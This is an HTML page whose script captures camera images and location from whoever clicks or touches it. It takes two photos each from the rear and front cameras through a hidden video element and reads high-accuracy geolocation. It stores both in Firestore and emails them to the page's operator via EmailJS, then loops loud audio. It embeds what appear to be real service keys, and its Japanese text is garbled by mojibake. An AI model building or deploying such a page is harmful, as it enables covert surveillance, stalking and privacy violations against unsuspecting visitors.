<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Firestoreä¿å­˜ï¼‹EmailJSé€ä¿¡ï¼ˆ2æšãšã¤é€£å†™ï¼‰ï¼‹éŸ³å£°å†ç”Ÿ</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #222; color: #eee;
    padding: 20px;
    user-select:none;
  }
  #status {
    background: rgba(0,0,0,0.7);
    padding: 10px;
    border-radius: 6px;
    max-height: 150px;
    overflow-y: auto;
    white-space: pre-wrap;
    font-family: monospace;
    margin-bottom: 20px;
  }
</style>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
    authDomain: "picture-storage-906ae.firebaseapp.com",
    projectId: "picture-storage-906ae",
    storageBucket: "picture-storage-906ae.firebasestorage.app",
    messagingSenderId: "134265329367",
    appId: "1:134265329367:web:b94063426b6307f8a8c292",
    measurementId: "G-9CP3F27EMF"
  };
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  emailjs.init("cPjKBUm_i6HebDQF7");

  const statusEl = document.getElementById("status");
  let busy = false;
  let audio;

  function log(text) {
    console.log(text);
    statusEl.textContent += text + "\n";
    statusEl.scrollTop = statusEl.scrollHeight;
  }

  async function capturePhotos(facingMode) {
    log(`ğŸ“¸ ${facingMode}ã‚«ãƒ¡ãƒ©èµ·å‹•`);
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    const video = document.createElement("video");
    video.style.display = "none";
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");

    const photos = [];
    for (let i = 0; i < 2; i++) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.3);
      photos.push(dataUrl);
      log(`æ’®å½± ${i + 1} æšç›® ã‚µã‚¤ã‚º: ${Math.round((dataUrl.length * 3) / 4 / 1024)} KB`);
      await new Promise(r => setTimeout(r, 50));
    }

    stream.getTracks().forEach(t => t.stop());
    video.remove();
    return photos;
  }

  function getLocation() {
    log("ğŸ“ ä½ç½®æƒ…å ±å–å¾—é–‹å§‹");
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("ä½ç½®æƒ…å ±éå¯¾å¿œ"));
        return;
      }
      navigator.geolocation.getCurrentPosition(pos => {
        const loc = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy,
          time: new Date(pos.timestamp).toLocaleString()
        };
        log(`ä½ç½®æƒ…å ±å–å¾—æˆåŠŸ: ç·¯åº¦${loc.lat}, çµŒåº¦${loc.lon}, ç²¾åº¦${loc.acc}m`);
        resolve(loc);
      }, err => {
        log(`âš ï¸ ä½ç½®æƒ…å ±å–å¾—å¤±æ•—: ${err.message}`);
        resolve({ lat: "ä¸æ˜", lon: "ä¸æ˜", acc: "ä¸æ˜", time: new Date().toLocaleString() });
      }, { enableHighAccuracy: true, timeout: 10000 });
    });
  }

  async function saveToFirestore(data) {
    log("â¬†ï¸ Firestoreã«ä¿å­˜ä¸­...");
    try {
      await addDoc(collection(db, "photos_with_location"), data);
      log("âœ… Firestoreä¿å­˜å®Œäº†");
    } catch (e) {
      log("âŒ Firestoreä¿å­˜å¤±æ•—: " + e.message);
    }
  }

  async function sendEmail(data) {
    log("âœ‰ï¸ EmailJSé€ä¿¡ä¸­...");
    try {
      await emailjs.send('service_ja2c09x', 'template_2fp2jrg', data);
      log("âœ… Emailé€ä¿¡å®Œäº†");
    } catch (e) {
      log("âŒ Emailé€ä¿¡å¤±æ•—: " + e.message);
    }
  }

  async function runProcess() {
    if (busy) {
      log("âŒ å‡¦ç†ä¸­ã§ã™ã€‚äºŒé‡å®Ÿè¡Œé˜²æ­¢");
      return;
    }
    busy = true;
    log("ğŸ”„ å‡¦ç†é–‹å§‹");

    try {
      const rearPhotos = await capturePhotos("environment");
      const frontPhotos = await capturePhotos("user");
      const location = await getLocation();

      const firestoreData = {
        rearPhotos,
        frontPhotos,
        location,
        createdAt: new Date().toISOString(),
      };
      await saveToFirestore(firestoreData);

      const templateParams = {
        photo_rear1: rearPhotos[0],
        photo_rear2: rearPhotos[1],
        photo_front1: frontPhotos[0],
        photo_front2: frontPhotos[1],
        location_info: `ç·¯åº¦: ${location.lat}<br>çµŒåº¦: ${location.lon}<br>ç²¾åº¦: ${location.acc}m<br>æ™‚åˆ»: ${location.time}`,
        date: new Date().toLocaleString()
      };
      await sendEmail(templateParams);

      log("ğŸ‰ å‡¦ç†å®Œäº†ï¼");
    } catch (e) {
      log("âŒ å…¨ä½“å‡¦ç†ã‚¨ãƒ©ãƒ¼: " + e.message);
    } finally {
      busy = false;
    }
  }

  // ã‚¯ãƒªãƒƒã‚¯ã•ã‚ŒãŸã‚‰base64 mp3ã‚’çˆ†éŸ³ã§ãƒ«ãƒ¼ãƒ—å†ç”Ÿ
  function playLoopSound() {
    if(audio) return; // ã™ã§ã«å†ç”Ÿä¸­ãªã‚‰ç„¡è¦–

    const base64mp3 = "data:audio/mp3;base64,//uQxAAAD..."; // ã“ã“ã«base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰æ¸ˆã¿mp3ãƒ‡ãƒ¼ã‚¿ã‚’å…¥ã‚Œã¦ãã ã•ã„

    audio = new Audio(base64mp3);
    audio.loop = true;
    audio.volume = 1.0; // çˆ†éŸ³
    audio.play().catch(e => {
      log("âŒ éŸ³å£°å†ç”Ÿå¤±æ•—: " + e.message);
    });
  }

  window.addEventListener("click", () => {
    runProcess();
    playLoopSound();
  });

  window.addEventListener("touchstart", (e) => {
    e.preventDefault();
    runProcess();
    playLoopSound();
  }, { passive: false });

</script>
</head>
<body>
  <h1>ğŸ“¸ Firestoreä¿å­˜ï¼‹EmailJSé€ä¿¡ï¼ˆ2æšãšã¤é€£å†™ï¼‰ï¼‹éŸ³å£°å†ç”Ÿ</h1>
  <pre id="status">å¾…æ©Ÿä¸­...</pre>
</body>
</html>
